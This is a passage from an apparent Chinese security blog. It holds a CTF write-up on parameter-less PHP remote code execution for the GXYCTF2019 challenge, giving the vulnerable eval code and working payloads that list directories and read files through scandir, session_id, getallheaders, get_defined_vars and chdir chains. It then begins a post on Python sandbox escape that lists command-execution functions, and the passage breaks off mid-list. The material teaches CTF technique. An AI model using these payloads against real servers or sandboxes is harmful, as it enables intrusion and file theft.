class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">current</span>(<span class="hljs-title function_ invoke__">localeconv</span>())));<br></code></pre></td></tr></table></figure><p>数组移动操作：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">end</span>() ： 将内部指针指向数组中的最后一个元素，并输出<br><span class="hljs-title function_ invoke__">next</span>() ：将内部指针指向数组中的下一个元素，并输出<br><span class="hljs-title function_ invoke__">prev</span>() ：将内部指针指向数组中的上一个元素，并输出<br><span class="hljs-title function_ invoke__">reset</span>() ： 将内部指针指向数组中的第一个元素，并输出<br><span class="hljs-title function_ invoke__">each</span>() ： 返回当前元素的键名和键值，并将内部指针向前移动<br></code></pre></td></tr></table></figure><h3 id="方法一：scandir-最常规的通解"><a href="#方法一：scandir-最常规的通解" class="headerlink" title="方法一：scandir() 最常规的通解"></a>方法一：scandir() 最常规的通解</h3><p>一道例题BuuCTF [GXYCTF2019]禁止套娃</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;;&#x27;</span> === <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;<br>                <span class="hljs-comment">// echo $_GET[&#x27;exp&#x27;];</span><br>                @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>]);<br>            &#125;<br>            <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;还差一点哦！&quot;</span>);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;再好好想想！&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;还想读flag，臭弟弟！&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-comment">// highlight_file(__FILE__);</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>最终的payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">exp=<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-title function_ invoke__">next</span>(<span class="hljs-title function_ invoke__">array_reverse</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">current</span>(<span class="hljs-title function_ invoke__">localeconv</span>())))));<br></code></pre></td></tr></table></figure><p>接下来逐个分析payload的构成：</p><p>1、var_dump(localeconv());可以看见第一个string[1]就是一个“.”，这个点是由localeconv()产生的</p><img src="/blog/2025/01/29/PHP/%E6%97%A0%E5%8F%82%E6%95%B0rce/image-20250129200501464.png" class title="image-20250129200501464"><p>2、利用<code>current()</code>函数将这个点取出来的，<code>‘.’</code>代表的是当前目录，那接下来就很好理解了，我们可以利用这个点完成遍历目录的操作，相当于就是<code>linux</code>中的<code>ls</code>指令</p><img src="/blog/2025/01/29/PHP/%E6%97%A0%E5%8F%82%E6%95%B0rce/image-20250129200643025.png" class title="image-20250129200643025"><p>3、既然current()取第一个值，那么current(localeconv())构造一个<code>&#39;.&#39;</code>,<strong>而</strong><code>&#39;.&#39;</code> <strong>表示当前目录</strong>，<code>scandir(&#39;.&#39;)</code> 将返回当前目录中的文件和子目录，这里我们得知flag所在的文件名就是flag.php</p><img src="/blog/2025/01/29/PHP/%E6%97%A0%E5%8F%82%E6%95%B0rce/image-20250129200853439.png" class title="image-20250129200853439"><p>4、然而flag的文件名在比较后端我们可以通过array_reverse()将数组内容反转，让它从倒数第二的位置变成正数第二</p><img src="/blog/2025/01/29/PHP/%E6%97%A0%E5%8F%82%E6%95%B0rce/image-20250129200918061.png" class title="image-20250129200918061"><p>5、移动指针读取第二个数组，参照下列数组移动操作可知我们应选用next()函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">end</span>() ： 将内部指针指向数组中的最后一个元素，并输出<br><span class="hljs-title function_ invoke__">next</span>() ：将内部指针指向数组中的下一个元素，并输出<br><span class="hljs-title function_ invoke__">prev</span>() ：将内部指针指向数组中的上一个元素，并输出<br><span class="hljs-title function_ invoke__">reset</span>() ： 将内部指针指向数组中的第一个元素，并输出<br><span class="hljs-title function_ invoke__">each</span>() ： 返回当前元素的键名和键值，并将内部指针向前移动<br></code></pre></td></tr></table></figure><p>6、最后用highlight_file()返回文件内容</p><p>使用最多最灵活的一个函数,可以构造出不同用法，这里直接引用了别人的payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-title function_ invoke__">array_rand</span>(<span class="hljs-title function_ invoke__">array_flip</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">getcwd</span>())))); <span class="hljs-comment">//查看和读取当前目录文件</span><br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-title function_ invoke__">getcwd</span>()))); <span class="hljs-comment">//查看上一级目录的文件</span><br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">next</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">getcwd</span>()))));  <span class="hljs-comment">//查看上一级目录的文件</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-title function_ invoke__">array_rand</span>(<span class="hljs-title function_ invoke__">array_flip</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-title function_ invoke__">getcwd</span>()))))))); <span class="hljs-comment">//读取上级目录文件</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-title function_ invoke__">array_rand</span>(<span class="hljs-title function_ invoke__">array_flip</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-title function_ invoke__">hebrevc</span>(<span class="hljs-title function_ invoke__">crypt</span>(<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-title function_ invoke__">next</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">getcwd</span>())))))))))));<span class="hljs-comment">//读取上级目录文件</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-title function_ invoke__">array_rand</span>(<span class="hljs-title function_ invoke__">array_flip</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-title function_ invoke__">hebrevc</span>(<span class="hljs-title function_ invoke__">crypt</span>(<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-title function_ invoke__">next</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-title function_ invoke__">hebrevc</span>(<span class="hljs-title function_ invoke__">crypt</span>(<span class="hljs-title function_ invoke__">phpversion</span>())))))))))))))));<span class="hljs-comment">//读取上级目录文件</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-title function_ invoke__">array_rand</span>(<span class="hljs-title function_ invoke__">array_flip</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-title function_ invoke__">current</span>(<span class="hljs-title function_ invoke__">localtime</span>(<span class="hljs-title function_ invoke__">time</span>(<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-title function_ invoke__">next</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">current</span>(<span class="hljs-title function_ invoke__">localeconv</span>()))))))))))));<span class="hljs-comment">//这个得爆破，不然手动要刷新很久，如果文件是正数或倒数第一个第二个最好不过了，直接定位</span><br>  <span class="hljs-comment">//查看和读取根目录文件</span><br>  <span class="hljs-comment">//查看和读取根目录文件</span><br></code></pre></td></tr></table></figure><h3 id="方法二：session-id"><a href="#方法二：session-id" class="headerlink" title="方法二：session_id()"></a>方法二：session_id()</h3><p> 使用条件：当请求头中有cookie时（或者走投无路手动添加cookie头也行，有些CTF题不会卡）</p><p> 首先我们需要开启session_start()来保证session_id()的使用，session_id可以用来获取当前会话ID，也就是说它可以抓取PHPSESSID后面的东西，但是phpsession不允许()出现</p><h4 id="法一：hex2bin（）"><a href="#法一：hex2bin（）" class="headerlink" title="法一：hex2bin（）"></a>法一：hex2bin（）</h4><p>我们自己手动对命令进行十六进制编码，后面在用函数hex2bin()解码转回去，使得后端实际接收到的是恶意代码。我们把想要执行的命令进行十六进制编码后，替换掉‘Cookie:PHPSESSID&#x3D;’后面的值</p><p>以下是十六进制编码脚本：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$encoded</span> = <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-string">&quot;phpinfo();&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$encoded</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>得到phpinfo();的十六进制编码，即706870696e666f28293b</p><p>那么payload就可以是：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?参数=<span class="hljs-keyword">eval</span>(<span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-title function_ invoke__">session_id</span>(<span class="hljs-title function_ invoke__">session_start</span>())));<br></code></pre></td></tr></table></figure><p>同时更改cookie后的值为想执行的命令的十六进制编码</p><h4 id="法二：读文件"><a href="#法二：读文件" class="headerlink" title="法二：读文件"></a>法二：读文件</h4><p>例题依然是[GXYCTF2019]禁止套娃，在知道文件名为flag.php的情况下直接读文件</p><p>如果已知文件名，把文件名写在PHPSESSID后面，构造payload为：</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title"><span class="hljs-built_in">readfile</span></span>(<span class="hljs-title">session_id</span>(<span class="hljs-title">session_start</span>()));</span><br></code></pre></td></tr></table></figure><img src="/blog/2025/01/29/PHP/%E6%97%A0%E5%8F%82%E6%95%B0rce/image-20250129201750646.png" class title="image-20250129201750646"><h3 id="方法三：getallheaders"><a href="#方法三：getallheaders" class="headerlink" title="方法三：getallheaders()"></a>方法三：getallheaders()</h3><p>getallheaders()返回当前请求的所有请求头信息，局限于Apache（apache_request_headers()和getallheaders()功能相似，可互相替代，不过也是局限于Apache）</p><p>当确定能够返回时，我们就能在数据包最后一行加上一个请求头，写入恶意代码，再用end()函数指向最后一个请求头，使其执行，payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">end</span>(<span class="hljs-title function_ invoke__">getallheaders</span>()));<br></code></pre></td></tr></table></figure><p>借用别人的图演示：</p><img src="/blog/2025/01/29/PHP/%E6%97%A0%E5%8F%82%E6%95%B0rce/image-20250129202117068.png" class title="image-20250129202117068"><p>sky是自己添加的请求头， end()指向最后一行的sky后的代码，达到phpinfo的目的，然后可以进一步去rce。</p><h3 id="方法四：get-defined-vars"><a href="#方法四：get-defined-vars" class="headerlink" title="方法四：get_defined_vars()"></a>方法四：get_defined_vars()</h3><p>相较于getallheaders（）更加具有普遍性，它可以回显全局变量$_GET、$_POST、$_FILES、$_COOKIE，</p><p>返回数组顺序为$_GET–&gt;$_POST–&gt;$_COOKIE–&gt;$_FILES</p><p>首先确认是否有回显：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">get_defined_vars</span>());<br></code></pre></td></tr></table></figure><p>假如说原本只有一个参数a，那么可以多加一个参数b，后面写入恶意语句，payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">a=<span class="hljs-keyword">eval</span>(<span class="hljs-title function_ invoke__">end</span>(<span class="hljs-title function_ invoke__">current</span>(<span class="hljs-title function_ invoke__">get_defined_vars</span>())));&amp;b=<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;ls /&#x27;</span>);<br></code></pre></td></tr></table></figure><p>把eval换成assert也行 ，能执行system(‘ls &#x2F;‘)就行</p><h3 id="方法五：chdir-array-rand-赌狗读文件"><a href="#方法五：chdir-array-rand-赌狗读文件" class="headerlink" title="方法五：chdir()&amp;array_rand()赌狗读文件"></a>方法五：chdir()&amp;array_rand()赌狗读文件</h3><p>实在无法rce，可以考虑目录遍历进行文件读取</p><p>利用<code>getcwd()</code>获取当前目录：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">getcwd</span>());<br></code></pre></td></tr></table></figure><p>结合dirname()列出当前工作目录的父目录中的所有文件和目录:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-title function_ invoke__">getcwd</span>())));<br></code></pre></td></tr></table></figure><p> 读上一级文件名：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">?code=<span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-title function_ invoke__">array_rand</span>(<span class="hljs-title function_ invoke__">array_flip</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-title function_ invoke__">getcwd</span>())))))));<br><br>?code=<span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-title function_ invoke__">array_rand</span>(<span class="hljs-title function_ invoke__">array_flip</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-title function_ invoke__">hebrevc</span>(<span class="hljs-title function_ invoke__">crypt</span>(<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-title function_ invoke__">next</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">getcwd</span>())))))))))));<br><br>?code=<span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-title function_ invoke__">array_rand</span>(<span class="hljs-title function_ invoke__">array_flip</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-title function_ invoke__">hebrevc</span>(<span class="hljs-title function_ invoke__">crypt</span>(<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-title function_ invoke__">next</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-title function_ invoke__">hebrevc</span>(<span class="hljs-title function_ invoke__">crypt</span>(<span class="hljs-title function_ invoke__">phpversion</span>())))))))))))))));<br></code></pre></td></tr></table></figure><p>读根目录:</p><p>ord() 函数和 chr() 函数：只能对第一个字符进行转码，ord() 编码，chr)解码，有概率会解码出斜杠读取根目录</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?code=<span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-title function_ invoke__">crypt</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">array</span>())))))));<br></code></pre></td></tr></table></figure><p>要用chdir()固定，payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?code=<span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-title function_ invoke__">array_rand</span>(<span class="hljs-title function_ invoke__">array_flip</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-title function_ invoke__">crypt</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">array</span>() )))))))))));<br></code></pre></td></tr></table></figure><p>通过bp的intruder模块来读到根目录：</p><img src="/blog/2025/01/29/PHP/%E6%97%A0%E5%8F%82%E6%95%B0rce/image-20250129202327073.png" class title="image-20250129202327073"><img src="/blog/2025/01/29/PHP/%E6%97%A0%E5%8F%82%E6%95%B0rce/image-20250129202339375.png" class title="image-20250129202339375"><p>文章参考：<br><a href="https://blog.csdn.net/2301_76690905/article/details/133808536">https://blog.csdn.net/2301_76690905/article/details/133808536</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Python沙箱逃逸</title>
    <link href="/blog/2025/01/24/Python/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"/>
    <url>/blog/2025/01/24/Python/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/</url>
    
    <content type="html"><![CDATA[<h2 id="执行模块"><a href="#执行模块" class="headerlink" title="执行模块"></a>执行模块</h2><p>在Python中执行系统命令的方式有</p><ul><li>os</li><li>commands：仅限<code>2.x</code></li><li>subprocess：subprocess.getoutput(“whoami”),print(a);subprocess.run(“whoami”)</li><li>timeit：timeit.sys，<code>timeit.timeit(&quot;__import__(&#39;os&#39;).system(&#39;whoami&#39;)&quot;, number=1)</code></li><li>platform：platform.os，platform.sys，platform.popen(‘whoami’, mode&#x3D;’r’, bufsize&#x3D;-1).read()</li><li>pty：pty.spawn(‘ls’)，pty.os</li><li>bdb：bdb.os，cgi.sys</li><li>cgi：cgi.os，cgi.sys</li><li>….</li></ul><p>下面是一个脚本，跑出了其中导入os或者sys还有<code>__builtins__</code>的库：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python">all_modules_Python2 = [<br>    <span class="hljs-string">&#x27;BaseHTTPServer&#x27;</span>, <span class="hljs-string">&#x27;imaplib&#x27;</span>, <span class="hljs-string">&#x27;shelve&#x27;</span>, <span class="hljs-string">&#x27;Bastion&#x27;</span>, <span class="hljs-string">&#x27;anydbm&#x27;</span>, <span class="hljs-string">&#x27;imghdr&#x27;</span>, <span class="hljs-string">&#x27;shlex&#x27;</span>, <span class="hljs-string">&#x27;CDROM&#x27;</span>, <span class="hljs-string">&#x27;argparse&#x27;</span>, <span class="hljs-string">&#x27;imp&#x27;</span>, <span class="hljs-string">&#x27;shutil&#x27;</span>, <span class="hljs-string">&#x27;CGIHTTPServer&#x27;</span>, <span class="hljs-string">&#x27;array&#x27;</span>, <span class="hljs-string">&#x27;importlib&#x27;</span>, <span class="hljs-string">&#x27;signal&#x27;</span>, <span class="hljs-string">&#x27;Canvas&#x27;</span>, <span class="hljs-string">&#x27;ast&#x27;</span>, <span class="hljs-string">&#x27;imputil&#x27;</span>, <span class="hljs-string">&#x27;site&#x27;</span>, <span class="hljs-string">&#x27;ConfigParser&#x27;</span>, <span class="hljs-string">&#x27;asynchat&#x27;</span>, <span class="hljs-string">&#x27;inspect&#x27;</span>, <span class="hljs-string">&#x27;sitecustomize&#x27;</span>, <span class="hljs-string">&#x27;Cookie&#x27;</span>, <span class="hljs-string">&#x27;asyncore&#x27;</span>, <span class="hljs-string">&#x27;io&#x27;</span>, <span class="hljs-string">&#x27;smtpd&#x27;</span>, <span class="hljs-string">&#x27;DLFCN&#x27;</span>, <span class="hljs-string">&#x27;atexit&#x27;</span>, <span class="hljs-string">&#x27;itertools&#x27;</span>, <span class="hljs-string">&#x27;smtplib&#x27;</span>, <span class="hljs-string">&#x27;Dialog&#x27;</span>, <span class="hljs-string">&#x27;audiodev&#x27;</span>, <span class="hljs-string">&#x27;json&#x27;</span>, <span class="hljs-string">&#x27;sndhdr&#x27;</span>, <span class="hljs-string">&#x27;DocXMLRPCServer&#x27;</span>, <span class="hljs-string">&#x27;audioop&#x27;</span>, <span class="hljs-string">&#x27;keyword&#x27;</span>, <span class="hljs-string">&#x27;socket&#x27;</span>, <span class="hljs-string">&#x27;FileDialog&#x27;</span>, <span class="hljs-string">&#x27;base64&#x27;</span>, <span class="hljs-string">&#x27;lib2to3&#x27;</span>, <span class="hljs-string">&#x27;spwd&#x27;</span>, <span class="hljs-string">&#x27;FixTk&#x27;</span>, <span class="hljs-string">&#x27;bdb&#x27;</span>, <span class="hljs-string">&#x27;linecache&#x27;</span>, <span class="hljs-string">&#x27;sqlite3&#x27;</span>, <span class="hljs-string">&#x27;HTMLParser&#x27;</span>, <span class="hljs-string">&#x27;binascii&#x27;</span>, <span class="hljs-string">&#x27;linuxaudiodev&#x27;</span>, <span class="hljs-string">&#x27;sre&#x27;</span>, <span class="hljs-string">&#x27;IN&#x27;</span>, <span class="hljs-string">&#x27;binhex&#x27;</span>, <span class="hljs-string">&#x27;locale&#x27;</span>, <span class="hljs-string">&#x27;sre_compile&#x27;</span>, <span class="hljs-string">&#x27;MimeWriter&#x27;</span>, <span class="hljs-string">&#x27;bisect&#x27;</span>, <span class="hljs-string">&#x27;logging&#x27;</span>, <span class="hljs-string">&#x27;sre_constants&#x27;</span>, <span class="hljs-string">&#x27;Queue&#x27;</span>, <span class="hljs-string">&#x27;bsddb&#x27;</span>, <span class="hljs-string">&#x27;lsb_release&#x27;</span>, <span class="hljs-string">&#x27;sre_parse&#x27;</span>, <span class="hljs-string">&#x27;ScrolledText&#x27;</span>, <span class="hljs-string">&#x27;bz2&#x27;</span>, <span class="hljs-string">&#x27;macpath&#x27;</span>, <span class="hljs-string">&#x27;ssl&#x27;</span>, <span class="hljs-string">&#x27;SimpleDialog&#x27;</span>, <span class="hljs-string">&#x27;cPickle&#x27;</span>, <span class="hljs-string">&#x27;macurl2path&#x27;</span>, <span class="hljs-string">&#x27;stat&#x27;</span>, <span class="hljs-string">&#x27;SimpleHTTPServer&#x27;</span>, <span class="hljs-string">&#x27;cProfile&#x27;</span>, <span class="hljs-string">&#x27;mailbox&#x27;</span>, <span class="hljs-string">&#x27;statvfs&#x27;</span>, <span class="hljs-string">&#x27;SimpleXMLRPCServer&#x27;</span>, <span class="hljs-string">&#x27;cStringIO&#x27;</span>, <span class="hljs-string">&#x27;mailcap&#x27;</span>, <span class="hljs-string">&#x27;string&#x27;</span>, <span class="hljs-string">&#x27;SocketServer&#x27;</span>, <span class="hljs-string">&#x27;calendar&#x27;</span>, <span class="hljs-string">&#x27;markupbase&#x27;</span>, <span class="hljs-string">&#x27;stringold&#x27;</span>, <span class="hljs-string">&#x27;StringIO&#x27;</span>, <span class="hljs-string">&#x27;cgi&#x27;</span>, <span class="hljs-string">&#x27;marshal&#x27;</span>, <span class="hljs-string">&#x27;stringprep&#x27;</span>, <span class="hljs-string">&#x27;TYPES&#x27;</span>, <span class="hljs-string">&#x27;cgitb&#x27;</span>, <span class="hljs-string">&#x27;math&#x27;</span>, <span class="hljs-string">&#x27;strop&#x27;</span>, <span class="hljs-string">&#x27;Tix&#x27;</span>, <span class="hljs-string">&#x27;chunk&#x27;</span>, <span class="hljs-string">&#x27;md5&#x27;</span>, <span class="hljs-string">&#x27;struct&#x27;</span>, <span class="hljs-string">&#x27;Tkconstants&#x27;</span>, <span class="hljs-string">&#x27;cmath&#x27;</span>, <span class="hljs-string">&#x27;mhlib&#x27;</span>, <span class="hljs-string">&#x27;subprocess&#x27;</span>, <span class="hljs-string">&#x27;Tkdnd&#x27;</span>, <span class="hljs-string">&#x27;cmd&#x27;</span>, <span class="hljs-string">&#x27;mimetools&#x27;</span>, <span class="hljs-string">&#x27;sunau&#x27;</span>, <span class="hljs-string">&#x27;Tkinter&#x27;</span>, <span class="hljs-string">&#x27;code&#x27;</span>, <span class="hljs-string">&#x27;mimetypes&#x27;</span>, <span class="hljs-string">&#x27;sunaudio&#x27;</span>, <span class="hljs-string">&#x27;UserDict&#x27;</span>, <span class="hljs-string">&#x27;codecs&#x27;</span>, <span class="hljs-string">&#x27;mimify&#x27;</span>, <span class="hljs-string">&#x27;symbol&#x27;</span>, <span class="hljs-string">&#x27;UserList&#x27;</span>, <span class="hljs-string">&#x27;codeop&#x27;</span>, <span class="hljs-string">&#x27;mmap&#x27;</span>, <span class="hljs-string">&#x27;symtable&#x27;</span>, <span class="hljs-string">&#x27;UserString&#x27;</span>, <span class="hljs-string">&#x27;collections&#x27;</span>, <span class="hljs-string">&#x27;modulefinder&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;_LWPCookieJar&#x27;</span>, <span class="hljs-string">&#x27;colorsys&#x27;</span>, <span class="hljs-string">&#x27;multifile&#x27;</span>, <span class="hljs-string">&#x27;sysconfig&#x27;</span>, <span class="hljs-string">&#x27;_MozillaCookieJar&#x27;</span>, <span class="hljs-string">&#x27;commands&#x27;</span>, <span class="hljs-string">&#x27;multiprocessing&#x27;</span>, <span class="hljs-string">&#x27;syslog&#x27;</span>, <span class="hljs-string">&#x27;__builtin__&#x27;</span>, <span class="hljs-string">&#x27;compileall&#x27;</span>, <span class="hljs-string">&#x27;mutex&#x27;</span>, <span class="hljs-string">&#x27;tabnanny&#x27;</span>, <span class="hljs-string">&#x27;__future__&#x27;</span>, <span class="hljs-string">&#x27;compiler&#x27;</span>, <span 